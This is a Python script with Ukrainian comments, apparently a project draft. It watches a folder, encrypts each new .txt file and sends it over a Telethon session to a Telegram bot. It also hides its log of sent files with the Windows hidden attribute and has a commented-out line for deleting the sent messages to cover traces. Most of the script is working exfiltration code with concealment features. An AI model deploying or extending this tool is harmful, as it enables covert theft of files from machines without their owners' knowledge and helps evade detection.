import os
import asyncio
import ctypes
from telethon import TelegramClient
from cryptography.fernet import Fernet

# тут якщо будеш пробувати у себе запускати, то треба твої підключити і зробити нового бота в тг
API_ID =           
API_HASH = ""   
KEY = b''
BOT_USERNAME = "" 

TARGET_FOLDER = "./target_folder"
LOG_FILE = "./.sent_logs.sys" # щоб повторно файлики не надсилались, але треба обговорити який метод будемо юзати
cipher_suite = Fernet(KEY)

client = TelegramClient('user_session', API_ID, API_HASH)

def hide_file_windows(filepath):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(filepath, 2)
    except Exception:
        pass

def load_sent_logs():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            return set(f.read().splitlines())
    return set()

def save_to_log(filename):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(filename + "\n")
    hide_file_windows(LOG_FILE)

async def monitor_and_send():
    if not os.path.exists(TARGET_FOLDER):
        os.makedirs(TARGET_FOLDER)
    print(f"[*] Моніторю папку: {TARGET_FOLDER}")
    
    # Завантажуємо історію з файлу, а не просто створюємо порожню пам'ять
    sent_files = load_sent_logs() 
    print(f"[*] Вже відправлено в минулих сесіях: {len(sent_files)} файлів.")
    
    while True:
        for filename in os.listdir(TARGET_FOLDER):
            file_path = os.path.join(TARGET_FOLDER, filename)
            if os.path.isfile(file_path) and filename.endswith(".txt") and filename not in sent_files: # тут зробила фільтр лише на txt файли, і лише на ті, що ще не відправлялись
                with open(file_path, "rb") as f: # шифруємо файли, можна буде ще попрацювати над цим блоком 
                    enc_data = cipher_suite.encrypt(f.read())
                enc_path = file_path + ".enc"
                with open(enc_path, "wb") as f:
                    f.write(enc_data)
                    
                print(f"\n[*] Знайшов файл {filename}. Починаю передачу")
                async with client.conversation(BOT_USERNAME) as conv:
                    sent_msg = await conv.send_message(file=enc_path) # відправляю
                    response = await conv.get_response() # отримую відповідь від сервера
                    print(f"[Сервер ПК2]: {response.text}") # видаю відповідь у консоль
                    # await client.delete_messages(BOT_USERNAME, [sent_msg.id, response.id]) # підчищаю сліди

                sent_files.add(filename) # тут файл летить в пам'ять і видаляється локальний шифрований дублікат
                save_to_log(filename)
                os.remove(enc_path)
        await asyncio.sleep(3) 

async def main():
    await client.start()
    print("[+] Можна починати")
    await monitor_and_send()

if __name__ == '__main__':
    client.loop.run_until_complete(main())